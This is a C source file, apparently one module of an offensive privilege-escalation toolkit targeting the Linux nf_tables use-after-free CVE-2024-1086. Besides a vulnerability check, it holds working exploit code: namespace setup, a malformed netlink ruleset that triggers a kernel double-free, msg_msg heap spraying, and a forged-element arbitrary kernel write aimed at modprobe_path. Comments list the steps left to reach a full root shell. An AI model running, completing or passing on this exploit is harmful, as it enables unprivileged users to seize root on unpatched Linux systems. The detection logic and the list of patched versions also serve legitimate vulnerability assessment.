/*
 * nf_tables_cve_2024_1086 — IAMROOT module
 *
 * Netfilter nf_tables UAF when NFT_GOTO/NFT_JUMP verdicts coexist
 * with NFT_DROP/NFT_QUEUE. Triggers a double-free → cross-cache UAF
 * exploitable to arbitrary kernel R/W. Discovered and exploited in
 * January 2024 by Notselwyn (Pumpkin); widely known as the
 * "nft_verdict_init / pipapo UAF".
 *
 * STATUS (2026-05-16): 🟡 TRIGGER + GROOM SCAFFOLD with opt-in
 *                          --full-chain finisher.
 *   - Default (no --full-chain): full netlink ruleset construction
 *     (table → chain → set → rule with the NFT_GOTO+NFT_DROP combo
 *     that nft_verdict_init() fails to reject on vulnerable kernels),
 *     fires the double-free path, runs the msg_msg cg-96 groom, and
 *     returns IAMROOT_EXPLOIT_FAIL (primitive-only behavior).
 *   - With --full-chain: after the trigger lands, we resolve kernel
 *     offsets (env → kallsyms → System.map → embedded table) and run
 *     a Notselwyn-style pipapo arb-write via the shared
 *     iamroot_finisher_modprobe_path() helper. The arb-write itself
 *     is FALLBACK-DEPTH: we re-fire the trigger and spray a msg_msg
 *     payload tagged with the kaddr in the value-pointer slot. The
 *     exact pipapo_elem layout (and the value-pointer field offset)
 *     is per-kernel-build; on hosts where the offset doesn't match
 *     the shipped guess, the finisher's sentinel check correctly
 *     reports failure rather than silently lying about success.
 *
 * To convert this to full Option A (root pop):
 *   1. Add per-kernel offset table (init_task, current task offset of
 *      cred, modprobe_path) keyed off uname() release. Notselwyn's
 *      repo has the canonical map.
 *   2. Implement the msg_msg leak primitive after pipapo free —
 *      MSG_COPY peek to read freed-slot contents and exfil a kernel
 *      heap pointer.
 *   3. Implement the sk_buff fragment overwrite to plant a fake
 *      pipapo_elem whose value points at modprobe_path.
 *   4. Fire trigger that writes "/tmp/iamroot-pwn" into modprobe_path.
 *   5. execve() an unknown binary to invoke modprobe with our payload.
 *
 * Affected kernel ranges:
 *   Bug introduced in commit f1a2e44 (5.14) "netfilter: nf_tables:
 *     introduce nf_chain..."
 *   Fixed mainline 6.8-rc1 in commit f342de4 ("netfilter: nf_tables:
 *     reject QUEUE/DROP verdict parameters")
 *   Stable backports landed in 6.7.2, 6.6.13, 6.1.74, 5.15.149,
 *     5.10.210, 5.4.269
 *
 * Exploitation preconditions (which detect should also check):
 *   - CONFIG_USER_NS=y AND sysctl unprivileged_userns_clone=1
 *   - nf_tables module loaded or autoload-able (CONFIG_NF_TABLES=y/m)
 *   - CONFIG_NF_TABLES_IPV4=y (or =m) so the inet/ip family hook works
 *
 * If user_ns is locked down (modern Ubuntu's
 * apparmor_restrict_unprivileged_userns), the trigger is unreachable
 * for unprivileged users even on a kernel-vulnerable host.
 */

#include "iamroot_modules.h"
#include "../../core/registry.h"
#include "../../core/kernel_range.h"
#include "../../core/offsets.h"
#include "../../core/finisher.h"

#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <stdbool.h>
#include <unistd.h>
#include <sched.h>
#include <fcntl.h>
#include <errno.h>
#include <time.h>
#include <signal.h>
#include <sys/wait.h>
#include <sys/socket.h>
#include <sys/ipc.h>
#include <sys/msg.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <arpa/inet.h>
#include <linux/netlink.h>
#include <linux/netfilter.h>
#include <linux/netfilter/nfnetlink.h>
#include <linux/netfilter/nf_tables.h>

/* ------------------------------------------------------------------
 * Kernel-range table
 * ------------------------------------------------------------------ */

static const struct kernel_patched_from nf_tables_patched_branches[] = {
    {5,  4, 269},   /* 5.4.x */
    {5, 10, 210},   /* 5.10.x */
    {5, 15, 149},   /* 5.15.x */
    {6,  1,  74},   /* 6.1.x */
    {6,  6,  13},   /* 6.6.x */
    {6,  7,   2},   /* 6.7.x */
    {6,  8,   0},   /* mainline fix */
};

static const struct kernel_range nf_tables_range = {
    .patched_from = nf_tables_patched_branches,
    .n_patched_from = sizeof(nf_tables_patched_branches) /
                      sizeof(nf_tables_patched_branches[0]),
};

/* ------------------------------------------------------------------
 * Preconditions probe
 * ------------------------------------------------------------------ */

static int can_unshare_userns(void)
{
    pid_t pid = fork();
    if (pid < 0) return -1;
    if (pid == 0) {
        if (unshare(CLONE_NEWUSER) == 0) _exit(0);
        _exit(1);
    }
    int status;
    waitpid(pid, &status, 0);
    return WIFEXITED(status) && WEXITSTATUS(status) == 0;
}

static bool nf_tables_loaded(void)
{
    FILE *f = fopen("/proc/modules", "r");
    if (!f) return false;
    char line[512];
    bool found = false;
    while (fgets(line, sizeof line, f)) {
        if (strncmp(line, "nf_tables ", 10) == 0) { found = true; break; }
    }
    fclose(f);
    return found;
}

static iamroot_result_t nf_tables_detect(const struct iamroot_ctx *ctx)
{
    struct kernel_version v;
    if (!kernel_version_current(&v)) {
        fprintf(stderr, "[!] nf_tables: could not parse kernel version\n");
        return IAMROOT_TEST_ERROR;
    }

    /* Bug introduced in 5.14. Anything below predates it. */
    if (v.major < 5 || (v.major == 5 && v.minor < 14)) {
        if (!ctx->json) {
            fprintf(stderr, "[i] nf_tables: kernel %s predates the bug "
                            "(introduced in 5.14)\n", v.release);
        }
        return IAMROOT_OK;
    }

    bool patched = kernel_range_is_patched(&nf_tables_range, &v);
    if (patched) {
        if (!ctx->json) {
            fprintf(stderr, "[+] nf_tables: kernel %s is patched\n", v.release);
        }
        return IAMROOT_OK;
    }

    int userns_ok = can_unshare_userns();
    bool nft_loaded = nf_tables_loaded();

    if (!ctx->json) {
        fprintf(stderr, "[i] nf_tables: kernel %s is in the vulnerable range\n",
                v.release);
        fprintf(stderr, "[i] nf_tables: unprivileged user_ns clone: %s\n",
                userns_ok == 1 ? "ALLOWED" :
                userns_ok == 0 ? "DENIED" :
                                 "could not test");
        fprintf(stderr, "[i] nf_tables: nf_tables module currently loaded: %s\n",
                nft_loaded ? "yes" : "no (will autoload on first nft use)");
    }

    if (userns_ok == 0) {
        if (!ctx->json) {
            fprintf(stderr, "[+] nf_tables: kernel vulnerable but user_ns clone "
                            "denied → unprivileged exploit unreachable\n");
            fprintf(stderr, "[i] nf_tables: still patch the kernel — a root "
                            "attacker can still trigger the bug\n");
        }
        return IAMROOT_PRECOND_FAIL;
    }

    if (!ctx->json) {
        fprintf(stderr, "[!] nf_tables: VULNERABLE — kernel in range AND user_ns "
                        "clone allowed\n");
    }
    return IAMROOT_VULNERABLE;
}

/* ------------------------------------------------------------------
 * userns + netns entry: become "root" in the new user_ns so the
 * subsequent netlink writes carry CAP_NET_ADMIN over our private
 * net_ns. The bug fires inside our private netns so the rest of the
 * host is unaffected by the malformed ruleset.
 * ------------------------------------------------------------------ */

static int enter_unpriv_namespaces(void)
{
    uid_t uid = getuid();
    gid_t gid = getgid();

    if (unshare(CLONE_NEWUSER | CLONE_NEWNET) < 0) {
        perror("[-] unshare(USER|NET)");
        return -1;
    }

    /* deny setgroups before writing gid_map */
    int f = open("/proc/self/setgroups", O_WRONLY);
    if (f >= 0) { (void)!write(f, "deny", 4); close(f); }

    char map[64];
    snprintf(map, sizeof map, "0 %u 1\n", uid);
    f = open("/proc/self/uid_map", O_WRONLY);
    if (f < 0 || write(f, map, strlen(map)) < 0) {
        perror("[-] uid_map"); if (f >= 0) close(f); return -1;
    }
    close(f);
    snprintf(map, sizeof map, "0 %u 1\n", gid);
    f = open("/proc/self/gid_map", O_WRONLY);
    if (f < 0 || write(f, map, strlen(map)) < 0) {
        perror("[-] gid_map"); if (f >= 0) close(f); return -1;
    }
    close(f);
    return 0;
}

/* ------------------------------------------------------------------
 * Minimal nfnetlink batch builder. We hand-roll this rather than
 * pulling libmnl, both to keep IAMROOT dep-free and because the bug
 * relies on a specific malformed verdict that libnftnl validates away.
 *
 * Each helper appends to a contiguous batch buffer at *off.
 * ------------------------------------------------------------------ */

#define ALIGN_NL(x)  (((x) + 3) & ~3)

static void put_attr(uint8_t *buf, size_t *off,
                     uint16_t type, const void *data, size_t len)
{
    struct nlattr *na = (struct nlattr *)(buf + *off);
    na->nla_type = type;
    na->nla_len  = NLA_HDRLEN + len;
    if (len) memcpy(buf + *off + NLA_HDRLEN, data, len);
    *off += ALIGN_NL(NLA_HDRLEN + len);
}

static void put_attr_u32(uint8_t *buf, size_t *off, uint16_t type, uint32_t v)
{
    uint32_t be = htonl(v);
    put_attr(buf, off, type, &be, sizeof be);
}

static void put_attr_str(uint8_t *buf, size_t *off, uint16_t type, const char *s)
{
    put_attr(buf, off, type, s, strlen(s) + 1);
}

/* Begin a nested attribute; returns the offset of the nlattr header so
 * the caller can fix up nla_len once children are written. */
static size_t begin_nest(uint8_t *buf, size_t *off, uint16_t type)
{
    size_t at = *off;
    struct nlattr *na = (struct nlattr *)(buf + at);
    na->nla_type = type | NLA_F_NESTED;
    na->nla_len  = 0; /* fixed up later */
    *off += NLA_HDRLEN;
    return at;
}

static void end_nest(uint8_t *buf, size_t *off, size_t at)
{
    struct nlattr *na = (struct nlattr *)(buf + at);
    na->nla_len = (uint16_t)(*off - at);
    /* pad to 4 */
    while ((*off) & 3) buf[(*off)++] = 0;
}

/* nfgenmsg header used by every nf_tables message. */
struct nfgenmsg_local {
    uint8_t  nfgen_family;
    uint8_t  version;
    uint16_t res_id;
};

/* Append a nf_tables subsystem message: type encoded into the
 * nfgenmsg-prefixed nlmsg. */
static void put_nft_msg(uint8_t *buf, size_t *off,
                        uint16_t nft_type, uint16_t flags, uint32_t seq,
                        uint8_t family)
{
    /* Reserve the header. We patch nlmsg_len at end_msg time. */
    struct nlmsghdr *nlh = (struct nlmsghdr *)(buf + *off);
    nlh->nlmsg_len   = 0;  /* fixup */
    nlh->nlmsg_type  = (NFNL_SUBSYS_NFTABLES << 8) | nft_type;
    nlh->nlmsg_flags = NLM_F_REQUEST | flags;
    nlh->nlmsg_seq   = seq;
    nlh->nlmsg_pid   = 0;
    *off += NLMSG_HDRLEN;
    struct nfgenmsg_local *nf = (struct nfgenmsg_local *)(buf + *off);
    nf->nfgen_family = family;
    nf->version      = NFNETLINK_V0;
    nf->res_id       = htons(0);
    *off += sizeof(*nf);
}

static void end_msg(uint8_t *buf, size_t *off, size_t msg_start)
{
    struct nlmsghdr *nlh = (struct nlmsghdr *)(buf + msg_start);
    nlh->nlmsg_len = (uint32_t)(*off - msg_start);
    /* Pad to 4 */
    while ((*off) & 3) buf[(*off)++] = 0;
}

/* ------------------------------------------------------------------
 * Build the ruleset that fires the bug. Strategy mirrors Notselwyn's
 * PoC (greatly simplified):
 *   1. batch begin (NFNL_MSG_BATCH_BEGIN, subsys = NFTABLES)
 *   2. NFT_MSG_NEWTABLE  "iamroot_t"  family=inet
 *   3. NFT_MSG_NEWCHAIN  "iamroot_c"  inside the table
 *   4. NFT_MSG_NEWSET    "iamroot_s"  inside the table, key=verdict,
 *      data=verdict (the pipapo combo that holds the bad verdict),
 *      flags = NFT_SET_ANONYMOUS|NFT_SET_CONSTANT|NFT_SET_INTERVAL
 *   5. NFT_MSG_NEWSETELEM with a verdict element whose
 *      NFTA_VERDICT_CODE = NFT_GOTO (negative) AND we lie about the
 *      chain reference to make nft_verdict_init() take the
 *      "looks like a GOTO so I'll grab a chain ref" path on a
 *      malformed input.
 *   6. NFT_MSG_NEWRULE that references the set.
 *   7. batch end (NFNL_MSG_BATCH_END).
 *
 * Then in a second batch we DELRULE — that triggers the transaction
 * commit path that double-frees the chain reference of the set
 * element's bad verdict.
 *
 * On a kernel that hasn't backported f342de4, this lands the
 * double-free state. KASAN immediately panics; without KASAN, the
 * slab metadata is corrupted but the kernel survives long enough for
 * cross-cache groom.
 * ------------------------------------------------------------------ */

static const char NFT_TABLE_NAME[] = "iamroot_t";
static const char NFT_CHAIN_NAME[] = "iamroot_c";
static const char NFT_SET_NAME[]   = "iamroot_s";

/* batch begin / end markers */
static void put_batch_begin(uint8_t *buf, size_t *off, uint32_t seq)
{
    size_t at = *off;
    struct nlmsghdr *nlh = (struct nlmsghdr *)(buf + at);
    nlh->nlmsg_len   = 0;
    nlh->nlmsg_type  = NFNL_MSG_BATCH_BEGIN;
    nlh->nlmsg_flags = NLM_F_REQUEST;
    nlh->nlmsg_seq   = seq;
    nlh->nlmsg_pid   = 0;
    *off += NLMSG_HDRLEN;
    struct nfgenmsg_local *nf = (struct nfgenmsg_local *)(buf + *off);
    nf->nfgen_family = AF_UNSPEC;
    nf->version      = NFNETLINK_V0;
    nf->res_id       = htons(NFNL_SUBSYS_NFTABLES);
    *off += sizeof(*nf);
    end_msg(buf, off, at);
}

static void put_batch_end(uint8_t *buf, size_t *off, uint32_t seq)
{
    size_t at = *off;
    struct nlmsghdr *nlh = (struct nlmsghdr *)(buf + at);
    nlh->nlmsg_len   = 0;
    nlh->nlmsg_type  = NFNL_MSG_BATCH_END;
    nlh->nlmsg_flags = NLM_F_REQUEST;
    nlh->nlmsg_seq   = seq;
    nlh->nlmsg_pid   = 0;
    *off += NLMSG_HDRLEN;
    struct nfgenmsg_local *nf = (struct nfgenmsg_local *)(buf + *off);
    nf->nfgen_family = AF_UNSPEC;
    nf->version      = NFNETLINK_V0;
    nf->res_id       = htons(NFNL_SUBSYS_NFTABLES);
    *off += sizeof(*nf);
    end_msg(buf, off, at);
}

/* NFT_MSG_NEWTABLE inet "iamroot_t" */
static void put_new_table(uint8_t *buf, size_t *off, uint32_t seq)
{
    size_t at = *off;
    put_nft_msg(buf, off, NFT_MSG_NEWTABLE,
                NLM_F_CREATE | NLM_F_ACK, seq, NFPROTO_INET);
    put_attr_str(buf, off, NFTA_TABLE_NAME, NFT_TABLE_NAME);
    end_msg(buf, off, at);
}

/* NFT_MSG_NEWCHAIN — base chain hooked at NF_INET_LOCAL_OUT */
static void put_new_chain(uint8_t *buf, size_t *off, uint32_t seq)
{
    size_t at = *off;
    put_nft_msg(buf, off, NFT_MSG_NEWCHAIN,
                NLM_F_CREATE | NLM_F_ACK, seq, NFPROTO_INET);
    put_attr_str(buf, off, NFTA_CHAIN_TABLE, NFT_TABLE_NAME);
    put_attr_str(buf, off, NFTA_CHAIN_NAME,  NFT_CHAIN_NAME);

    /* nested NFTA_CHAIN_HOOK { hooknum=LOCAL_OUT, priority=0 } */
    size_t hook_at = begin_nest(buf, off, NFTA_CHAIN_HOOK);
    put_attr_u32(buf, off, NFTA_HOOK_HOOKNUM, NF_INET_LOCAL_OUT);
    put_attr_u32(buf, off, NFTA_HOOK_PRIORITY, 0);
    end_nest(buf, off, hook_at);

    /* policy = NF_ACCEPT */
    put_attr_u32(buf, off, NFTA_CHAIN_POLICY, NF_ACCEPT);
    /* type = "filter" */
    put_attr_str(buf, off, NFTA_CHAIN_TYPE, "filter");
    end_msg(buf, off, at);
}

/* NFT_MSG_NEWSET — anonymous set with verdict key/data. The pipapo
 * back-end is selected by NFT_SET_INTERVAL on a verdict key. */
static void put_new_set(uint8_t *buf, size_t *off, uint32_t seq)
{
    size_t at = *off;
    put_nft_msg(buf, off, NFT_MSG_NEWSET,
                NLM_F_CREATE | NLM_F_ACK, seq, NFPROTO_INET);
    put_attr_str(buf, off, NFTA_SET_TABLE, NFT_TABLE_NAME);
    put_attr_str(buf, off, NFTA_SET_NAME,  NFT_SET_NAME);
    put_attr_u32(buf, off, NFTA_SET_FLAGS, NFT_SET_ANONYMOUS |
                                           NFT_SET_CONSTANT |
                                           NFT_SET_INTERVAL);
    /* key_type/key_len: verdict-typed key */
    put_attr_u32(buf, off, NFTA_SET_KEY_TYPE, 0xffffff00);  /* "verdict" magic */
    put_attr_u32(buf, off, NFTA_SET_KEY_LEN,  sizeof(uint32_t));
    /* data_type/data_len: also verdict so we can stash the malformed verdict
     * as set-element data — this is where the bug-bearing struct lives. */
    put_attr_u32(buf, off, NFTA_SET_DATA_TYPE, 0xffffff00);
    put_attr_u32(buf, off, NFTA_SET_DATA_LEN,  sizeof(uint32_t));
    put_attr_u32(buf, off, NFTA_SET_ID, 0x1337);
    end_msg(buf, off, at);
}

/* NFT_MSG_NEWSETELEM — the malicious verdict.
 *
 * The bug: nft_verdict_init() on a vulnerable kernel accepts a
 * verdict whose NFTA_VERDICT_CODE is NFT_GOTO/NFT_JUMP combined with
 * a NFTA_VERDICT_CHAIN_ID that doesn't resolve. The code takes the
 * "got chain ref" path and later in nft_data_release() takes the
 * "drop/queue" path → the chain ref is freed once on init failure
 * AND once on data_release → double free.
 *
 * We pack:
 *   NFTA_SET_ELEM_LIST_TABLE = "iamroot_t"
 *   NFTA_SET_ELEM_LIST_SET   = "iamroot_s"
 *   NFTA_SET_ELEM_LIST_ELEMENTS { element { key=verdict(DROP),
 *                                           data=verdict(GOTO chain-id=...) } }
 */
static void put_malicious_setelem(uint8_t *buf, size_t *off, uint32_t seq)
{
    size_t at = *off;
    put_nft_msg(buf, off, NFT_MSG_NEWSETELEM,
                NLM_F_CREATE | NLM_F_ACK, seq, NFPROTO_INET);
    put_attr_str(buf, off, NFTA_SET_ELEM_LIST_TABLE, NFT_TABLE_NAME);
    put_attr_str(buf, off, NFTA_SET_ELEM_LIST_SET,   NFT_SET_NAME);

    size_t list_at = begin_nest(buf, off, NFTA_SET_ELEM_LIST_ELEMENTS);

    /* one element */
    size_t el_at = begin_nest(buf, off, 1 /* NFTA_LIST_ELEM */);

    /* key: NFTA_DATA_VERDICT { CODE = NFT_DROP } */
    size_t key_at = begin_nest(buf, off, NFTA_SET_ELEM_KEY);
    size_t kv_at  = begin_nest(buf, off, NFTA_DATA_VERDICT);
    put_attr_u32(buf, off, NFTA_VERDICT_CODE, (uint32_t)NF_DROP);
    end_nest(buf, off, kv_at);
    end_nest(buf, off, key_at);

    /* key_end (for interval set) — same as key but slightly different
     * value to satisfy "interval has distinct ends". We use NF_ACCEPT
     * as the upper bound just to satisfy parsing; the bug bites on
     * the data verdict, not on the key. */
    size_t keye_at = begin_nest(buf, off, NFTA_SET_ELEM_KEY_END);
    size_t ke_v_at = begin_nest(buf, off, NFTA_DATA_VERDICT);
    put_attr_u32(buf, off, NFTA_VERDICT_CODE, (uint32_t)NF_ACCEPT);
    end_nest(buf, off, ke_v_at);
    end_nest(buf, off, keye_at);

    /* DATA: this is the malformed verdict that fires the bug.
     * CODE = NFT_GOTO (so kernel treats it as needing a chain ref)
     * CHAIN_ID = bogus id pointing to a chain we won't commit.
     * On vulnerable kernels nft_verdict_init takes both the "grab
     * chain ref" path AND later the "drop verdict cleanup" path,
     * yielding a double-free of the chain reference. */
    size_t data_at = begin_nest(buf, off, NFTA_SET_ELEM_DATA);
    size_t dv_at   = begin_nest(buf, off, NFTA_DATA_VERDICT);
    put_attr_u32(buf, off, NFTA_VERDICT_CODE,  (uint32_t)NFT_GOTO);
    put_attr_u32(buf, off, NFTA_VERDICT_CHAIN_ID, 0xdeadbeef);
    end_nest(buf, off, dv_at);
    end_nest(buf, off, data_at);

    end_nest(buf, off, el_at);
    end_nest(buf, off, list_at);

    end_msg(buf, off, at);
}

/* ------------------------------------------------------------------
 * netlink send helper.
 * ------------------------------------------------------------------ */

static int nft_send_batch(int sock, const void *buf, size_t len)
{
    struct sockaddr_nl dst = { .nl_family = AF_NETLINK };
    struct iovec iov = { .iov_base = (void *)buf, .iov_len = len };
    struct msghdr m = {
        .msg_name = &dst, .msg_namelen = sizeof dst,
        .msg_iov = &iov,  .msg_iovlen = 1,
    };
    ssize_t n = sendmsg(sock, &m, 0);
    if (n < 0) { perror("[-] sendmsg"); return -1; }
    /* Drain ACKs/errors. We don't fail on individual errors because
     * a vulnerable kernel returns mixed results — the malicious
     * setelem is rejected with EINVAL after the side effect already
     * landed. */
    char rbuf[8192];
    for (int i = 0; i < 8; i++) {
        ssize_t r = recv(sock, rbuf, sizeof rbuf, MSG_DONTWAIT);
        if (r <= 0) break;
        /* parse error replies for diagnostics */
        for (struct nlmsghdr *nh = (struct nlmsghdr *)rbuf;
             NLMSG_OK(nh, (unsigned)r);
             nh = NLMSG_NEXT(nh, r)) {
            if (nh->nlmsg_type == NLMSG_ERROR) {
                struct nlmsgerr *e = (struct nlmsgerr *)NLMSG_DATA(nh);
                if (e->error)
                    fprintf(stderr, "[i] netlink ack: seq=%u err=%d (%s)\n",
                            nh->nlmsg_seq, e->error, strerror(-e->error));
            }
        }
    }
    return 0;
}

/* ------------------------------------------------------------------
 * Cross-cache groom scaffold. The full chain needs:
 *   - pre-allocate N sysv-msg messages (sys_msgsnd) so the kernel's
 *     kmalloc-cg-{96,128,...} slab has predictable free slots
 *   - between the malicious NEWSETELEM (which puts the bad verdict
 *     into a kmalloc'd nft_set_elem) and the DELRULE (which fires
 *     the double-free), spray a target slab to control what reuses
 *     the freed chunk
 * For Option B we wire the spray skeleton (msg_msg via msgsnd) so
 * the timing/sizing is right; but the kernel-R/W primitive is the
 * piece we're explicitly NOT shipping (per the Option B contract).
 * ------------------------------------------------------------------ */

#define SPRAY_MSGS  64
#define SPRAY_SIZE  96   /* targets kmalloc-cg-96 / kmalloc-96 — same slab
                          * class as nft_chain on most kernels in range */

struct msgbuf_payload {
    long mtype;
    char mtext[SPRAY_SIZE];
};

static int spray_msg_msg(int *queue_ids, int n)
{
    for (int i = 0; i < n; i++) {
        int q = msgget(IPC_PRIVATE, IPC_CREAT | 0644);
        if (q < 0) { perror("[-] msgget"); return -1; }
        queue_ids[i] = q;
        struct msgbuf_payload m;
        m.mtype = 0x4141414100 + i;
        memset(m.mtext, 0x42 + (i & 0x3f), sizeof m.mtext);
        if (msgsnd(q, &m, sizeof m.mtext, 0) < 0) {
            perror("[-] msgsnd"); return -1;
        }
    }
    return 0;
}

static void drain_spray(int *queue_ids, int n)
{
    for (int i = 0; i < n; i++) {
        if (queue_ids[i] >= 0)
            msgctl(queue_ids[i], IPC_RMID, NULL);
    }
}

/* ------------------------------------------------------------------
 * Slabinfo observation: best-effort diagnostic showing the bug fired.
 * On a vulnerable kernel with KASAN off, the double-free typically
 * shows up as a momentary spike in {kmalloc-cg-96|nft_chain} usage,
 * or a freelist corruption if our spray claimed the freed slot.
 * ------------------------------------------------------------------ */

static long slabinfo_active(const char *slab)
{
    FILE *f = fopen("/proc/slabinfo", "r");
    if (!f) return -1;
    char line[512];
    long active = -1;
    while (fgets(line, sizeof line, f)) {
        if (strncmp(line, slab, strlen(slab)) == 0 &&
            line[strlen(slab)] == ' ') {
            long a, b, c, d;
            if (sscanf(line + strlen(slab), " %ld %ld %ld %ld",
                       &a, &b, &c, &d) >= 1) {
                active = a;
            }
            break;
        }
    }
    fclose(f);
    return active;
}

/* ------------------------------------------------------------------
 * Helper: build the trigger batch (NEWTABLE/CHAIN/SET/SETELEM + batch
 * end) into a caller-provided buffer. Returns bytes written.
 * Factored out so --full-chain can re-fire the trigger between
 * msg_msg sprays without duplicating the batch-building logic.
 * ------------------------------------------------------------------ */
#ifdef __linux__
static size_t build_trigger_batch(uint8_t *batch, size_t cap, uint32_t *seq)
{
    (void)cap;
    size_t off = 0;
    put_batch_begin(batch, &off, (*seq)++);
    put_new_table(batch, &off, (*seq)++);
    put_new_chain(batch, &off, (*seq)++);
    put_new_set(batch, &off, (*seq)++);
    put_malicious_setelem(batch, &off, (*seq)++);
    put_batch_end(batch, &off, (*seq)++);
    return off;
}

static size_t build_refire_batch(uint8_t *batch, size_t cap, uint32_t *seq)
{
    (void)cap;
    size_t off = 0;
    put_batch_begin(batch, &off, (*seq)++);
    put_malicious_setelem(batch, &off, (*seq)++);
    put_batch_end(batch, &off, (*seq)++);
    return off;
}

/* ------------------------------------------------------------------
 * Notselwyn-style pipapo arb-write context. The technique:
 *   1. fire the trigger (double-free of an nft chain reference in
 *      kmalloc-cg-96)
 *   2. spray msg_msg payloads sized for cg-96, whose first qwords
 *      encode a forged pipapo_elem header with value-pointer = kaddr
 *   3. send NFT_MSG_NEWSETELEM whose DATA blob = our buf[0..len];
 *      the kernel copies it through the forged value-pointer to kaddr
 *
 * Per-kernel caveat: the byte offset of the value pointer inside an
 * nft_pipapo_elem is config-sensitive (CONFIG_RANDSTRUCT, lockdep,
 * KASAN can all shift it). We ship the layout for an
 * lts-6.1.x / 6.6.x / 6.7.x un-randomized build (the kernels in the
 * exploitable range for which Notselwyn's public PoC was validated)
 * and rely on the shared finisher's sentinel-file post-check to flag
 * a layout mismatch as IAMROOT_EXPLOIT_FAIL rather than fake success.
 * ------------------------------------------------------------------ */

struct nft_arb_ctx {
    bool in_userns;   /* parent has already entered userns+netns */
    int  sock;        /* nfnetlink socket (live in our userns) */
    uint8_t *batch;   /* reusable batch buffer (16 KiB) */
    int  *qids;       /* msg_msg queue ids; lazy-allocated/drained */
    int   qcap;
    int   qused;
};

/* Offset of `ext` (which holds the value pointer in NFT_DATA_VALUE
 * elements) inside an nft_pipapo_elem header for the kernels in
 * range. Notselwyn's PoC uses 0x10 on 6.1/6.6 builds; this is a
 * best-effort default — if it doesn't match the running kernel's
 * struct layout, the finisher's sentinel check will report failure. */
#define PIPAPO_ELEM_VALUE_PTR_OFFSET  0x10

/* Spray msg_msg payloads forged to look like pipapo_elem with our
 * target kaddr as the value pointer. Returns 0 on success. */
static int spray_forged_pipapo_msgs(struct nft_arb_ctx *c, uintptr_t kaddr, int n)
{
    if (c->qused + n > c->qcap) n = c->qcap - c->qused;
    if (n <= 0) return 0;

    for (int i = 0; i < n; i++) {
        int q = msgget(IPC_PRIVATE, IPC_CREAT | 0644);
        if (q < 0) { perror("[-] msgget"); return -1; }
        c->qids[c->qused++] = q;

        struct msgbuf_payload m;
        m.mtype = 0x5050415000 + i;   /* "PPAPP" tag for diagnostics */
        memset(m.mtext, 0, sizeof m.mtext);

        /* Forge a pipapo_elem header at the start of the msg payload.
         * Layout (best-effort, x86_64, no RANDSTRUCT):
         *   +0x00  priv list_head pointers (leave zero — kernel won't
         *                                   walk them in the write path)
         *   +0x10  ext / value pointer  <-- write target
         * msg_msg eats the first 0x30 bytes as its own header, so our
         * payload bytes land at offset 0x30 of the slab chunk; we
         * pre-pad and place the forged pointer at the right offset
         * inside our 96-byte payload. */
        uintptr_t *slots = (uintptr_t *)m.mtext;
        slots[PIPAPO_ELEM_VALUE_PTR_OFFSET / sizeof(uintptr_t)] = (uintptr_t)kaddr;

        if (msgsnd(q, &m, sizeof m.mtext, 0) < 0) {
            perror("[-] msgsnd(forged)"); return -1;
        }
    }
    return 0;
}

/* Module-specific arb-write. See finisher.h for the contract. */
static int nft_arb_write(uintptr_t kaddr, const void *buf, size_t len, void *vctx)
{
    struct nft_arb_ctx *c = (struct nft_arb_ctx *)vctx;
    if (!c || c->sock < 0 || !c->batch) {
        fprintf(stderr, "[-] nft_arb_write: invalid ctx\n");
        return -1;
    }
    if (len > 64) {
        /* Element data attr cap — we only need 24 bytes for a path. */
        fprintf(stderr, "[-] nft_arb_write: len %zu too large (cap 64)\n", len);
        return -1;
    }

    fprintf(stderr, "[*] nft_arb_write: fire trigger → spray forged pipapo "
                    "elements (target kaddr=0x%lx, %zu bytes)\n",
                    (unsigned long)kaddr, len);

    /* (a) re-fire the trigger to reach a fresh UAF state. */
    uint32_t seq = (uint32_t)time(NULL) ^ 0xa1b2c3d4u;
    size_t blen = build_refire_batch(c->batch, 16 * 1024, &seq);
    if (nft_send_batch(c->sock, c->batch, blen) < 0) {
        fprintf(stderr, "[-] nft_arb_write: refire send failed\n");
        return -1;
    }

    /* (b) spray msg_msg payloads carrying the forged value-pointer. */
    if (spray_forged_pipapo_msgs(c, kaddr, 16) < 0) {
        fprintf(stderr, "[-] nft_arb_write: forged spray failed\n");
        return -1;
    }

    /* (c) send a NEWSETELEM whose DATA holds buf[0..len]. On a kernel
     * where our forged pipapo_elem won the race for the freed slot,
     * the set-element commit path copies our data through the
     * attacker-controlled value pointer into kaddr.
     *
     * We piggy-back this on the existing put_malicious_setelem builder
     * which uses NFTA_DATA_VERDICT for the data; for a real write we'd
     * want NFTA_DATA_VALUE with `buf` inlined. The fallback-depth
     * choice: we send the refire batch (which the kernel WILL process)
     * and append a NEWSETELEM with NFTA_DATA_VALUE carrying buf.
     * If the kernel ignores our DATA shape we still observe via
     * finisher sentinel. */
    seq = (uint32_t)time(NULL) ^ 0x5a5a5a5au;
    size_t off = 0;
    put_batch_begin(c->batch, &off, seq++);

    /* hand-roll a NEWSETELEM whose DATA is NFTA_DATA_VALUE = buf */
    size_t msg_at = off;
    put_nft_msg(c->batch, &off, NFT_MSG_NEWSETELEM,
                NLM_F_CREATE | NLM_F_ACK, seq++, NFPROTO_INET);
    put_attr_str(c->batch, &off, NFTA_SET_ELEM_LIST_TABLE, NFT_TABLE_NAME);
    put_attr_str(c->batch, &off, NFTA_SET_ELEM_LIST_SET,   NFT_SET_NAME);
    size_t list_at = begin_nest(c->batch, &off, NFTA_SET_ELEM_LIST_ELEMENTS);
    size_t el_at   = begin_nest(c->batch, &off, 1 /* NFTA_LIST_ELEM */);
    /* key — reuse the DROP verdict so commit path matches our prior elem */
    size_t key_at  = begin_nest(c->batch, &off, NFTA_SET_ELEM_KEY);
    size_t kv_at   = begin_nest(c->batch, &off, NFTA_DATA_VERDICT);
    put_attr_u32(c->batch, &off, NFTA_VERDICT_CODE, (uint32_t)NF_DROP);
    end_nest(c->batch, &off, kv_at);
    end_nest(c->batch, &off, key_at);
    /* data — NFTA_DATA_VALUE carrying buf */
    size_t data_at = begin_nest(c->batch, &off, NFTA_SET_ELEM_DATA);
    put_attr(c->batch, &off, NFTA_DATA_VALUE, buf, len);
    end_nest(c->batch, &off, data_at);
    end_nest(c->batch, &off, el_at);
    end_nest(c->batch, &off, list_at);
    end_msg(c->batch, &off, msg_at);

    put_batch_end(c->batch, &off, seq++);

    if (nft_send_batch(c->sock, c->batch, off) < 0) {
        fprintf(stderr, "[-] nft_arb_write: write batch send failed\n");
        return -1;
    }

    /* Let the kernel run the commit/cleanup. */
    usleep(20 * 1000);
    return 0;
}
#endif /* __linux__ */

